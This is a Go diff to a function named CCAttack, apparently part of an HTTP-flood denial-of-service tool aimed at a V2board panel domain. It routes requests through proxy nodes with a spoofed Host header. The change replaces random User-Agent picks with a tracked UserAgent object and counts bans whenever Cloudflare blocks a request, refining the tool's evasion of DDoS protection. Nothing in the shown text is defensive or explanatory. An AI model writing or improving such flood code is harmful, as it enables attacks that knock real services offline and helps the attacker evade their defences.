@@ -6,7 +6,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/google/uuid"
-	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -52,7 +51,7 @@ func urlToMetadata(rawURL string) (addr C.Metadata, err error) {
 	return
 }
 
-func CCAttack(p *Nodes, counts *int, res *resty.Response) (err error) {
+func CCAttack(p *Nodes, counts *int, res *resty.Response, ua *UserAgent) (err error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
@@ -86,7 +85,7 @@ func CCAttack(p *Nodes, counts *int, res *resty.Response) (err error) {
 	resp, err := resty.New().
 		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
 		R().SetHeaders(map[string]string{
-		"User-Agent": getUA(rand.Intn(6)),
+		"User-Agent": ua.UA,
 		"Host":       config.Cfg.V2boardDomain,
 	}).
 		SetContext(ctx).Get(baseURL.String())
@@ -104,6 +103,7 @@ func CCAttack(p *Nodes, counts *int, res *resty.Response) (err error) {
 
 	case strings.Contains(resp.String(), "cloudflare") || strings.Contains(resp.String(), "error code:"):
 		p.CFCheck = true
+		ua.BannedCounts++
 
 	case err == nil:
 		fmt.Printf("\n[%d] %s", *counts, resp.Status())
